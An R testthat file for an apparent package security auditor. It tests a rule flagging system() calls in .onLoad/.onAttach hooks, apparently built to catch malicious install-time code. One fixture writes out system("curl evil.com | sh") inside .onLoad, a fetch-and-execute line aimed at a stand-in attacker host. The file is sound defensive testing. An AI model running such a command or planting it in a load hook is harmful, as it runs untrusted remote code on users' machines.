# Inline Rules for Testing -----------------------------------------------------
test_rules <- list(
  onload_calls_system_linter = list(
    xpath = '//expr[
      LEFT_ASSIGN
      and expr[1]/SYMBOL[text() = ".onLoad" or text() = ".onAttach"]
      and expr[FUNCTION]/descendant::SYMBOL_FUNCTION_CALL[
        text() = "system" or text() = "system2"
      ]
    ]',
    message = "system() or system2() inside .onLoad or .onAttach.",
    type    = "warning",
    attck   = "T1059.004"
  )
)

# Helper: create a minimal package directory structure
make_test_pkg <- function(r_content, dir_name = "testpkg") {
  pkg_dir <- file.path(tempdir(), dir_name)
  r_dir   <- file.path(pkg_dir, "R")
  dir.create(r_dir, recursive = TRUE, showWarnings = FALSE)
  writeLines(r_content, file.path(r_dir, "zzz.R"))
  pkg_dir
}


# audit_package() --------------------------------------------------------------
test_that("audit_package() returns empty data frame when no findings", {
  pkg_dir <- make_test_pkg(
    ".onLoad <- function(l, p) { packageStartupMessage() }",
    "pkg_clean"
  )
  on.exit(unlink(pkg_dir, recursive = TRUE), add = TRUE)

  expect_message(
    result <- audit_package(pkg_dir, rules = test_rules),
    "No security findings"
  )
  expect_s3_class(result, "data.frame")
  expect_equal(nrow(result), 0L)
})


test_that("audit_package() detects findings despite nolint comment", {
  pkg_dir <- make_test_pkg(
    '.onLoad <- function(l, p) { # nolint\n  system("curl evil.com | sh")\n}',
    "pkg_nolint"
  )
  on.exit(unlink(pkg_dir, recursive = TRUE), add = TRUE)

  result <- audit_package(pkg_dir, rules = test_rules)
  expect_true(nrow(result) > 0L)
})


test_that("audit_package() stops if no R/ directory found", {
  tmp <- file.path(tempdir(), "notapkg")
  dir.create(tmp, showWarnings = FALSE)
  on.exit(unlink(tmp, recursive = TRUE), add = TRUE)

  expect_error(
    audit_package(tmp, rules = test_rules),
    "No R/ directory found"
  )
})
